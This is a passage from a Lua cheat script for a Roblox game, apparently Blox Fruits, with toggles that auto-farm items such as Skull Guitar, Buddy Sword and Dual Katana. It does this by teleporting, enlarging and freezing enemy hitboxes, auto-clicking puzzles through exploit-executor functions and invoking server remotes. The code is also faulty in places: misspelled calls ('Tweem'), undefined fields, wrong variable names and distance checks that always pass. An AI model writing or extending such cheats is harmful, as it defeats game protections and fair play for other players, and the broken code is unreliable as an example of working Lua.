                    if (Vector3.new(-11892.0703125, 930.57672119141,-8760.1591796875)-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                        wait(1.5)
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("HornedMan", "Bet")
                    end
                elseif game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible and string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Stone") then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Stone") then
                        for _, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Stone" then
                                OldCFrameRainbow=v.HumanoidRootPart.CFrame
                                repeat
                                    task.wait(_G.Fast_Delay)
                                    EquipWeapon(SelectWeapon)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.HumanoidRootPart.CFrame=OldCFrameRainbow
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    
                                until not _G.Auto_RainbowHaki or v.Humanoid.Health<=0 or not v.Parent or not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible
                            end
                        end
                    else
                        Tween(CFrame.new(-1086.11621, 38.8425903, 6768.71436))
                    end
                elseif game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible and string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Hydra Leader") then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Hydra Leader") then
                        for _, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Hydra Leader" then
                                OldCFrameRainbow=v.HumanoidRootPart.CFrame
                                repeat
                                    task.wait(_G.Fast_Delay)
                                    EquipWeapon(SelectWeapon)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.HumanoidRootPart.CFrame=OldCFrameRainbow
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    
                                until not _G.Auto_RainbowHaki or v.Humanoid.Health<=0 or not v.Parent or not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible
                            end
                        end
                    else
                        Tween(CFrame.new(5713.98877, 601.922974, 202.751251))
                    end
                elseif string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Kilo Admiral") then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Kilo Admiral") then
                        for _, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Kilo Admiral" then
                                OldCFrameRainbow=v.HumanoidRootPart.CFrame
                                repeat
                                    task.wait(_G.Fast_Delay)
                                    EquipWeapon(SelectWeapon)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    v.HumanoidRootPart.CFrame=OldCFrameRainbow
                                    
                                until not _G.Auto_RainbowHaki or v.Humanoid.Health<=0 or not v.Parent or not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible
                            end
                        end
                    else
                        Tween(CFrame.new(2877.61743, 423.558685,-7207.31006))
                    end
                elseif string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Captain Elephant") then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Captain Elephant") then
                        for _, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Captain Elephant" then
                                OldCFrameRainbow=v.HumanoidRootPart.CFrame
                                repeat
                                    task.wait(_G.Fast_Delay)
                                    EquipWeapon(SelectWeapon)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    v.HumanoidRootPart.CFrame=OldCFrameRainbow
                                    
                                until not _G.Auto_RainbowHaki or v.Humanoid.Health<=0 or not v.Parent or not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible
                            end
                        end
                    else
                        Tween(CFrame.new(-13485.0283, 331.709259,-8012.4873))
                    end
                elseif string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Beautiful Pirate") then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Beautiful Pirate") then
                        for _, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Beautiful Pirate" then
                                OldCFrameRainbow=v.HumanoidRootPart.CFrame
                                repeat
                                    task.wait(_G.Fast_Delay)
                                    EquipWeapon(SelectWeapon)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    v.HumanoidRootPart.CFrame=OldCFrameRainbow
                                    
                                until not _G.Auto_RainbowHaki or v.Humanoid.Health<=0 or not v.Parent or not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible
                            end
                        end
                    else
                        Tween(CFrame.new(5312.3598632813, 20.141201019287,-10.158538818359))
                    end
                else
                    Tween(CFrame.new(-11892.0703125, 930.57672119141,-8760.1591796875))
                    if (Vector3.new(-11892.0703125, 930.57672119141,-8760.1591796875)-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                        wait(1.5)
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("HornedMan", "Bet")
                    end
                end
            end
        end
    end)
end)
local ToggleAutoSkullGuitar = Tabs.Item:AddToggle("ToggleAutoSkullGuitar", {
    Title="Skull Guitar",
    Description="",
    Default=false
})
ToggleAutoSkullGuitar:OnChanged(function(Value)
    _G.Auto_SkullGuitar=Value
end)
Options.ToggleAutoSkullGuitar:SetValue(false)
spawn(function()
        while wait() do
            pcall(function()
                if _G.Auto_SkullGuitar then
                    if GetWeaponInventory("Skull Guitar")==false then
                        if (CFrame.new(-9681.458984375, 6.139880657196045, 6341.3720703125).Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                            if game:GetService("Workspace").NPCs:FindFirstChild("Skeleton Machine") then
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("soulGuitarBuy",true)
                            else
                                if game:GetService("Workspace").Map["Haunted Castle"].Candle1.Transparency==0 then
                                    if game:GetService("Workspace").Map["Haunted Castle"].Placard1.Left.Part.Transparency==0 then
                                        Quest2=true
                                        repeat wait() Tween(CFrame.new(-8762.69140625, 176.84783935546875, 6171.3076171875)) until (CFrame.new(-8762.69140625, 176.84783935546875, 6171.3076171875).Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 or not _G.Auto_SkullGuitar
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard7.Left.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard6.Left.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard5.Left.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard4.Right.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard3.Left.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard2.Right.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard1.Right.ClickDetector)
                                        wait(1)
                                    elseif game:GetService("Workspace").Map["Haunted Castle"].Tablet.Segment1:FindFirstChild("ClickDetector") then
                                        if game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part1:FindFirstChild("ClickDetector") then
                                            Quest4=true
                                            repeat wait() Tween(CFrame.new(-9553.5986328125, 65.62338256835938, 6041.58837890625)) until (CFrame.new(-9553.5986328125, 65.62338256835938, 6041.58837890625).Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 or not _G.Auto_SkullGuitar
                                            wait(1)
                                            Tween(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part3.CFrame)
                                            wait(1)
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part3.ClickDetector)
                                            wait(1)
                                            Tween(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.CFrame)
                                            wait(1)
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                                            wait(1)
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                                            wait(1)
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                                            wait(1)
                                            Tween(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.CFrame)
                                            wait(1)
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.ClickDetector)
                                            wait(1)
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.ClickDetector)
                                            wait(1)
                                            Tween(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part8.CFrame)
                                            wait(1)
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part8.ClickDetector)
                                            wait(1)
                                            Tween(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.CFrame)
                                            wait(1)
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                                            wait(1)
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                                            wait(1)
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                                        else
                                            Quest3=true
                                        end
                                    else
                                        if game:GetService("Workspace").NPCs:FindFirstChild("Ghost") then
                                            local args = {
                                                [1]="GuitarPuzzleProgress",
                                                [2]="Ghost"
                                            }
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                                        end
                                        if game.Workspace.Enemies:FindFirstChild("Living Zombie") then
                                            for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                                if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health>0 then
                                                    if v.Name=="Living Zombie" then
                                                        EquipWeapon(SelectWeapon)
                                                        v.HumanoidRootPart.Size=Vector3.new(60,60,60)
                                                        v.HumanoidRootPart.Transparency=1
                                                        v.Humanoid.JumpPower=0
                                                        v.Humanoid.WalkSpeed=0
                                                        v.HumanoidRootPart.CanCollide=false
                                                        v.HumanoidRootPart.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.new(0,20,0)
                                                        Tween(CFrame.new(-10160.787109375, 138.6616973876953, 5955.03076171875))
                                                        game:GetService'VirtualUser':CaptureController()
                                                        game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                                    end
                                                end
                                            end
                                        else
                                            Tween(CFrame.new(-10160.787109375, 138.6616973876953, 5955.03076171875))
                                        end
                                    end
                                else    
                                    if string.find(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent",2), "Error") then
                                        Tween(CFrame.new(-8653.2060546875, 140.98487854003906, 6160.033203125))
                                    elseif string.find(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent",2), "Nothing") then
                                        Tween("Wait Full Moon")
                                    else
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent",2,true)
                                    end
                                end
                            end
                        else
                            Tween(CFrame.new(-9681.458984375, 6.139880657196045, 6341.3720703125))
                        end
                        end
                    end
            end)
        end
end)
local ToggleAutoBuddy = Tabs.Item:AddToggle("ToggleAutoBuddy", {
    Title="Kiếm Buddy",
    Description="",
    Default=false
})
ToggleAutoBuddy:OnChanged(function(Value)
    _G.Auto_Buddy=Value
end)
Options.ToggleAutoBuddy:SetValue(false)
local BuddyPos = CFrame.new(-731.2034301757812, 381.5658874511719,-11198.4951171875)
spawn(function()
    while wait() do
        if _G.Auto_Buddy then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen") then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name=="Cake Queen" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                repeat
                                    task.wait(_G.Fast_Delay)
                                    Click()


AutoHaki()
                                    EquipWeapon(SelectWeapon)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.Humanoid.WalkSpeed=0
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    
                                until not _G.Auto_Buddy or not v.Parent or v.Humanoid.Health<=0
                            end
                        end
                    end
                else
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-BuddyPos.Position).Magnitude<1000000000 then
                        Tween(BuddyPos)
                    end
                end
                Tween(CFrame.new(-731.2034301757812, 381.5658874511719,-11198.4951171875))
                if game:GetService("ReplicatedStorage"):FindFirstChild("Cake Queen") then
                    Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Cake Queen").HumanoidRootPart.CFrame*Pos)
                end
            end)
        end
    end
end)
local ToggleAutoDualKatana = Tabs.Item:AddToggle("ToggleAutoDualKatana", {
    Title="Song Kiếm",
    Description="",
    Default=false
})
ToggleAutoDualKatana:OnChanged(function(Value)
    _G.Auto_DualKatana=Value
end)
Options.ToggleAutoDualKatana:SetValue(false)
spawn(function()
        while wait() do
            pcall(function()
                if _G.Auto_DualKatana then
                    if game.Players.LocalPlayer.Character:FindFirstChild("Tushita") or game.Players.LocalPlayer.Backpack:FindFirstChild("Tushita") or game.Players.LocalPlayer.Character:FindFirstChild("Yama") or game.Players.LocalPlayer.Backpack:FindFirstChild("Yama") then
                        if game.Players.LocalPlayer.Character:FindFirstChild("Tushita") or game.Players.LocalPlayer.Backpack:FindFirstChild("Tushita") then
                            if game.Players.LocalPlayer.Backpack:FindFirstChild("Tushita") then
                                EquipWeapon("Tushita")
                            end
                        elseif game.Players.LocalPlayer.Character:FindFirstChild("Yama") or game.Players.LocalPlayer.Backpack:FindFirstChild("Yama") then
                            if game.Players.LocalPlayer.Backpack:FindFirstChild("Yama") then
                                EquipWeapon("Yama")
                            end
                        end
                    else
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadItem","Tushita")
                    end
                end
            end)
        end
    end)
    spawn(function()
        while wait() do
            pcall(function()
                if _G.Auto_DualKatana then
                    if GetMaterial("Alucard Fragment")==0 then
                        Auto_Quest_Yama_1=true
                        Auto_Quest_Yama_2=false
                        Auto_Quest_Yama_3=false
                        Auto_Quest_Tushita_1=false
                        Auto_Quest_Tushita_2=false
                        Auto_Quest_Tushita_3=false
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                    elseif GetMaterial("Alucard Fragment")==1 then
                        Auto_Quest_Yama_1=false
                        Auto_Quest_Yama_2=true
                        Auto_Quest_Yama_3=false
                        Auto_Quest_Tushita_1=false
                        Auto_Quest_Tushita_2=false
                        Auto_Quest_Tushita_3=false
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                    elseif GetMaterial("Alucard Fragment")==2 then
                        Auto_Quest_Yama_1=false
                        Auto_Quest_Yama_2=false
                        Auto_Quest_Yama_3=true
                        Auto_Quest_Tushita_1=false
                        Auto_Quest_Tushita_2=false
                        Auto_Quest_Tushita_3=false
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                    elseif GetMaterial("Alucard Fragment")==3 then
                        Auto_Quest_Yama_1=false
                        Auto_Quest_Yama_2=false
                        Auto_Quest_Yama_3=false
                        Auto_Quest_Tushita_1=true
                        Auto_Quest_Tushita_2=false
                        Auto_Quest_Tushita_3=false
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                    elseif GetMaterial("Alucard Fragment")==4 then
                        Auto_Quest_Yama_1=false
                        Auto_Quest_Yama_2=false
                        Auto_Quest_Yama_3=false
                        Auto_Quest_Tushita_1=false
                        Auto_Quest_Tushita_2=true
                        Auto_Quest_Tushita_3=false
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                    elseif GetMaterial("Alucard Fragment")==5 then
                        Auto_Quest_Yama_1=false
                        Auto_Quest_Yama_2=false
                        Auto_Quest_Yama_3=false
                        Auto_Quest_Tushita_1=false
                        Auto_Quest_Tushita_2=false
                        Auto_Quest_Tushita_3=true
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                    elseif GetMaterial("Alucard Fragment")==6 then
                        if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton Boss [Lv. 2025] [Boss]") or game:GetService("Workspace").ReplicatedStorage:FindFirstChild("Cursed Skeleton Boss [Lv. 2025] [Boss]") then
                            Auto_Quest_Yama_1=false
                            Auto_Quest_Yama_2=false
                            Auto_Quest_Yama_3=false
                            Auto_Quest_Tushita_1=false
                            Auto_Quest_Tushita_2=false
                            Auto_Quest_Tushita_3=false
                            if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton Boss [Lv. 2025] [Boss]") or game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200]") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if v.Name=="Cursed Skeleton Boss" or v.Name=="Cursed Skeleton" then
                                        if v.Humanoid.Health>0 then
                                            EquipWeapon(Sword)
                                            Tween(v.HumanoidRootPart.CFrame*pos)
                                            v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                            v.HumanoidRootPart.Transparency=1
                                            v.Humanoid.JumpPower=0
                                            v.Humanoid.WalkSpeed=0
                                            v.HumanoidRootPart.CanCollide=false
                                            bringmob=true
                                            FarmPos=v.HumanoidRootPart.CFrame
                                            MonFarm=v.Name
                                            
                                        end
                                    end
                                end
                            end
                        else
                            if (CFrame.new(-12361.7060546875, 603.3547973632812,-6550.5341796875).Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                wait(1)
                                Tween(CFrame.new(-12361.7060546875, 603.3547973632812,-6550.5341796875))
                                wait(1.5)
                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                wait(1.5)
                                Tween(CFrame.new(-12253.5419921875, 598.8999633789062,-6546.8388671875))
                            else
                                Tween(CFrame.new(-12361.7060546875, 603.3547973632812,-6550.5341796875))
                            end   
                        end
                    end
                end
            end)
        end
    end)
    spawn(function()
        while wait() do
            if Auto_Quest_Yama_1 then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Mythological Pirate") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Mythological Pirate" then
                                repeat wait()
                                    Tween(v.HumanoidRootPart.CFrame*CFrame.new(0,0,-2))
                                until _G.Auto_DualKatana==false or Auto_Quest_Yama_1==false
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                            end
                        end
                    else
                        Tween(CFrame.new(-13451.46484375, 543.712890625,-6961.0029296875))
                    end
                end)
            end
        end
    end)
    spawn(function()
        while wait() do
            pcall(function()
                if Auto_Quest_Yama_2 then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v:FindFirstChild("HazeESP") then
                            v.HazeESP.Size=UDim2.new(50,50,50,50)
                            v.HazeESP.MaxDistance="inf"
                        end
                    end
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
                        if v:FindFirstChild("HazeESP") then
                            v.HazeESP.Size=UDim2.new(50,50,50,50)
                            v.HazeESP.MaxDistance="inf"
                        end
                    end
                end
            end)
        end
    end)
    spawn(function()
        while wait() do
            pcall(function()
                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                    if Auto_Quest_Yama_2 and v:FindFirstChild("HazeESP") and (v.HumanoidRootPart.Position-FarmPossEsp.Position).magnitude<=300 then
                        v.HumanoidRootPart.CFrame=FarmPossEsp
                        v.HumanoidRootPart.CanCollide=false
                        v.HumanoidRootPart.Size=Vector3.new(50,50,50)
                        if not v.HumanoidRootPart:FindFirstChild("BodyVelocity") then
                            local vc = Instance.new("BodyVelocity", v.HumanoidRootPart)
                            vc.MaxForce=Vector3.new(1, 1, 1)*math.huge
                            vc.Velocity=Vector3.new(0, 0, 0)
                        end
                    end
                end
            end)
        end
    end)
    spawn(function()
        while wait() do
            if Auto_Quest_Yama_2 then 
                pcall(function() 
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v:FindFirstChild("HazeESP") then
                            repeat wait()
                                if (v.HumanoidRootPart.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude>1000000000 then
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                else
                                    EquipWeapon(Sword)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                    v.HumanoidRootPart.Transparency=1
                                    v.Humanoid.JumpPower=0
                                    v.Humanoid.WalkSpeed=0
                                    v.HumanoidRootPart.CanCollide=false
                                    FarmPos=v.HumanoidRootPart.CFrame
                                    MonFarm=v.Name
                                    
                                    if v.Humanoid.Health<=0 and v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end                            
                                end      
                            until _G.Auto_DualKatana==false or Auto_Quest_Yama_2==false or not v.Parent or v.Humanoid.Health<=0 or not v:FindFirstChild("HazeESP")
                        else
                            for x,y in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
                                if y:FindFirstChild("HazeESP") then
                                    if (y.HumanoidRootPart.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude>1000000000 then
                                        Tween(y.HumanoidRootPart.CFrameMon*Pos)
                                    else
                                        Tween(y.HumanoidRootPart.CFrame*Pos)
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end)
    spawn(function()
        while wait() do
            if Auto_Quest_Yama_3 then
                pcall(function()
                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Hallow Essence") then         
                        Tween(game:GetService("Workspace").Map["Haunted Castle"].Summoner.Detection.CFrame)
                    elseif game:GetService("Workspace").Map:FindFirstChild("HellDimension") then
                        repeat wait()
                            if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200]") or game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200] [Boss]") or game:GetService("Workspace").Enemies:FindFirstChild("Hell's Messenger [Lv. 2200] [Boss]") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if v.Name=="Cursed Skeleton" or v.Name=="Cursed Skeleton" or v.Name=="Hell's Messenger" then
                                        if v.Humanoid.Health>0 then
                                            repeat wait()
                                                EquipWeapon(Sword)
                                                Tween(v.HumanoidRootPart.CFrame*Pos)
                                                v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                                v.HumanoidRootPart.Transparency=1
                                                v.Humanoid.JumpPower=0
                                                v.Humanoid.WalkSpeed=0
                                                v.HumanoidRootPart.CanCollide=false
                                                FarmPos=v.HumanoidRootPart.CFrame
                                                MonFarm=v.Name
                                                
                                                if v.Humanoid.Health<=0 and v.Humanoid:FindFirstChild("Animator") then
                                                    v.Humanoid.Animator:Destroy()
                                                end
                                            until v.Humanoid.Health<=0 or not v.Parent or Auto_Quest_Yama_3==false
                                        end
                                    end
                                end
                            else
                                wait(5)
                                Tween(game:GetService("Workspace").Map.HellDimension.Torch1.CFrame)
                                wait(1.5)
                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                wait(1.5)        
                                Tweem(game:GetService("Workspace").Map.HellDimension.Torch2.CFrame)
                                wait(1.5)
                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                wait(1.5)     
                                Tween(game:GetService("Workspace").Map.HellDimension.Torch3.CFrame)
                                wait(1.5)
                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                wait(1.5)     
                                Tween(game:GetService("Workspace").Map.HellDimension.Exit.CFrame)
                            end
                        until _G.Auto_DualKatana==false or Auto_Quest_Yama_3==false or GetMaterial("Alucard Fragment")==3
                    else
                        if game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper") or game.ReplicatedStorage:FindFirstChild("Soul Reaper [Lv. 2100] [Raid Boss]") then
                            if game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if v.Name=="Soul Reaper" then
                                        if v.Humanoid.Health>0 then
                                            repeat wait()
                                                Tween(v.HumanoidRootPart.CFrame*Pos)
                                            until _G.Auto_DualKatana==false or Auto_Quest_Yama_3==false or game:GetService("Workspace").Map:FindFirstChild("HellDimension")
                                        end
                                    end
                                end
                            else
                                Tween(CFrame.new(-9570.033203125, 315.9346923828125, 6726.89306640625))
                            end
                        else
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Bones","Buy",1,1)
                        end
                    end
                end)
            end
        end
    end)
    spawn(function()
        while wait() do
            if Auto_Quest_Tushita_1 then
                Tween(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125))
                wait(5)
                Tween(CFrame.new(-6120.0576171875, 16.455780029296875,-2250.697265625))
                wait(5)
                Tween(CFrame.new(-9533.2392578125, 7.254445552825928,-8372.69921875))    
            end
        end
    end)
    spawn(function()
        while wait() do
            if Auto_Quest_Tushita_2 then
                pcall(function()
                    if (CFrame.new(-5539.3115234375, 313.800537109375,-2972.372314453125).Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if Auto_Quest_Tushita_2 and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health>0 then
                                if (v.HumanoidRootPart.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<1000000000 then
                                    repeat wait()
                                        EquipWeapon(Sword)
                                        Tween(v.HumanoidRootPart.CFrame*Pos)
                                        v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                        v.HumanoidRootPart.Transparency=1
                                        v.Humanoid.JumpPower=0
                                        v.Humanoid.WalkSpeed=0
                                        v.HumanoidRootPart.CanCollide=false
                                        FarmPos=v.HumanoidRootPart.CFrame
                                        MonFarm=v.Name
                                        
                                        if v.Humanoid.Health<=0 and v.Humanoid:FindFirstChild("Animator") then
                                            v.Humanoid.Animator:Destroy()
                                        end
                                    until v.Humanoid.Health<=0 or not v.Parent or Auto_Quest_Tushita_2==false
                                end
                            end
                        end
                    else
                        Tween(CFrame.new(-5545.1240234375, 313.800537109375,-2976.616455078125))
                    end
                end)
            end
        end
    end)
    spawn(function()
        while wait() do
            if Auto_Quest_Tushita_3 then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen") or game.ReplicatedStorage:FindFirstChild("Cake Queen [Lv. 2175] [Boss]") then
                        if game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen") then
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name=="Cake Queen" then
                                    if v.Humanoid.Health>0 then
                                        repeat wait()
                                            EquipWeapon(Sword)
                                            Tween(v.HumanoidRootPart.CFrame*Pos)
                                            v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                            v.HumanoidRootPart.Transparency=1
                                            v.Humanoid.JumpPower=0
                                            v.Humanoid.WalkSpeed=0
                                            v.HumanoidRootPart.CanCollide=false
                                            FarmPos=v.HumanoidRootPart.CFrame
                                            MonFarm=v.Name
                                            
